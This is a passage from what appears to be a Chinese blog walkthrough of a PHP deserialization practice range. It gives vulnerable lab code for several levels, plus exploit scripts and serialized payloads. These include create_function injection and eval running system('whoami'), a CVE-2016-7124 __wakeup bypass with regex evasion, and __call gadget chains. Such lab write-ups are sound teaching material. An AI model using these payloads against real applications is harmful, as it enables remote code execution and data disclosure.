$this-&gt;pass==&quot;ok&quot;</code></p><p>这里就需要调用<code>__construct()</code>，就需要在实例化对象时，传入相应的参数值，从而给类的属性进行赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// user=&quot;daydream&quot;,pass=&quot;ok&quot;</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> mylogin(<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-string">&quot;ok&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/2.png"></p><h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p>这关跟上一关基本一样，只不过传参位置变成了<code>cookie</code>位置，抓个包在<code>cookie</code>里面传入刚刚的字符串就可以了，或者使用hackbar改下cookie的内容就可以了</p><h4 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)//析构函数，对象在销毁时调用</span><br><span class="hljs-function">        </span>&#123;        <br>                unserialize(<span class="hljs-keyword">$this</span>-&gt;key)();<span class="hljs-comment">// 结尾有个括号，可变函数</span><br>        &#125; <span class="hljs-comment">// 调用GetFlag类中的get_flag()</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//最终目的</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">$this</span>-&gt;action;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>(<span class="hljs-string">&#x27;flag&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接分析加exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;                    <span class="hljs-comment">// key应该是一个数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)//析构函数，对象在销毁时调用</span><br><span class="hljs-function">    </span>&#123;<br>        unserialize(<span class="hljs-keyword">$this</span>-&gt;key)();<span class="hljs-comment">// 结尾有个括号，可变函数</span><br>    &#125; <span class="hljs-comment">// 调用GetFlag类中的get_flag()</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;;&#125;system(&quot;whoami&quot;);//&#x27;</span>;<span class="hljs-comment">// 闭合前面，注释后面</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;create_function&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//最终目的</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">$this</span>-&gt;action;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> func;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> GetFlag;<br><span class="hljs-variable">$a</span>-&gt;key = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;get_flag&quot;</span>));<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 输出：O:4:&quot;func&quot;:1:&#123;s:3:&quot;key&quot;;s:123:&quot;a:2:&#123;i:0;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;code&quot;;s:21:&quot;;&#125;system(&quot;whoami&quot;);//&quot;;s:6:&quot;action&quot;;s:15:&quot;create_function&quot;;&#125;i:1;s:8:&quot;get_flag&quot;;&#125;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h4><p>这关主要是序列化格式过滤与CVE-2016-7124</p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/4.png" style="zoom:80%;"><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/5.png" style="zoom:80%;"><p>看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// 包含flag.php，最终打印出flag</span><br>            <span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span>-&gt;file);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">// CVE-2016-7124绕过__wakeup()</span><br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-keyword">echo</span> show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>,<span class="hljs-literal">true</span>);<span class="hljs-comment">// 先判断输入是否为空</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<span class="hljs-comment">// 正则过滤序列化后的字符串</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Are you daydreaming?&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            unserialize(<span class="hljs-variable">$cmd</span>);<span class="hljs-comment">// 反序列化操作</span><br>        &#125;<br>    &#125;<br><span class="hljs-comment">//sercet in flag.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这关就是绕过<code>__wakeup()</code>，绕过正则的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span>-&gt;file);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> secret(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// 输出O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="hljs-variable">$flag</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$flag</span> = str_replace(<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;+6&#x27;</span>,<span class="hljs-variable">$flag</span>);<span class="hljs-comment">// 绕过正则，序列化格式过滤</span><br><span class="hljs-variable">$flag</span> = str_replace(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-variable">$flag</span>);<span class="hljs-comment">// CVE-2016-7124绕过__wakeup()</span><br><span class="hljs-comment">// O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/6.png"></p><h4 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$comm</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$com</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;comm = <span class="hljs-variable">$com</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;comm);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>];<br><span class="hljs-variable">$param</span>=str_replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-variable">$param</span>);<span class="hljs-comment">// 限制了url编码的形式</span><br>unserialize(<span class="hljs-variable">$param</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这关是私有属性反序列化</p><p>当类中有私有属性时，在进行序列化操作时会在类名两边出现不可见的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 举例</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pri</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hello world!&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> pri();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>)) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-comment">// 输出</span><br><span class="hljs-comment">// O:3:&quot;pri&quot;:1:&#123;s:8:&quot; pri str&quot;;N;&#125;</span><br><span class="hljs-comment">// O%3A3%3A%22pri%22%3A1%3A%7Bs%3A8%3A%22%00pri%00str%22%3BN%3B%7D</span><br><span class="hljs-comment">// 会在私有属性的变量名前后增加\00</span><br></code></pre></td></tr></table></figure><p>回到题目，其实就是考察是否能够注意到私有属性在序列化之后的那两个不可见字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$comm</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$com</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;comm = <span class="hljs-variable">$com</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> secret(<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// 输出 O:6:&quot;secret&quot;:1:&#123;s:12:&quot; secret comm&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;  注意不可见字符</span><br><span class="hljs-comment">// 更改为：O:6:\&quot;secret\&quot;:1:&#123;s:12:\&quot;\00secret\00comm\&quot;;s:17:\&quot;system(\&quot;whoami\&quot;);\&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/7.png"></p><h4 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">you</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pro</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$project</span>=<span class="hljs-keyword">$this</span>-&gt;pro;<br>        <span class="hljs-keyword">$this</span>-&gt;body-&gt;<span class="hljs-variable">$project</span>();<span class="hljs-comment">// 调用方法，若body为my类实例化后的对象，而$project又不是my类中的方法</span><br>    &#125;<span class="hljs-comment">// 那就成功触发__call()，并且$project也将作为__call()的第一个参数传入</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">my</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>)// 在对象上下文中调用不可访问的方法时触发</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> == <span class="hljs-string">&#x27;yourname&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;name == <span class="hljs-string">&#x27;myname&#x27;</span>) &#123;<span class="hljs-comment">// 最终目的打印flag</span><br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>__call()</code>调用一个不存在或者无法访问的方法时，会触发并且执行<code>__call()</code>，如果有该函数的情况下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">you</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pro</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;body = <span class="hljs-keyword">new</span> my();<br>        <span class="hljs-keyword">$this</span>-&gt;pro = <span class="hljs-string">&#x27;yourname&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$project</span>=<span class="hljs-keyword">$this</span>-&gt;pro;<br>        <span class="hljs-keyword">$this</span>-&gt;body-&gt;<span class="hljs-variable">$project</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">my</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;myname&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> == <span class="hljs-string">&#x27;yourname&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">$this</span>-&gt;name == <span class="hljs-string">&#x27;myname&#x27;</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> you();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$p</span>);<br><span class="hljs-comment">// 输出:O:3:&quot;you&quot;:2:&#123;s:9:&quot; you body&quot;;O:2:&quot;my&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;myname&quot;;&#125;s:8:&quot; you pro&quot;;s:8:&quot;yourname&quot;;&#125;</span><br><span class="hljs-comment">// 更改为：O:3:\&quot;you\&quot;:2:&#123;s:9:\&quot;\00you\00body\&quot;;O:2:\&quot;my\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;myname\&quot;;&#125;s:8:\&quot;\00you\00pro\&quot;;s:8:\&quot;yourname\&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/8.png"></p><h4 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 源码</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>    <span class="hljs-variable">$safe</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>);<br>    <span class="hljs-variable">$name</span>=str_replace(<span class="hljs-variable">$safe</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>];<br><span class="hljs-variable">$profile</span>=unserialize(filter(<span class="hljs-variable">$param</span>));<br>var_dump(<span 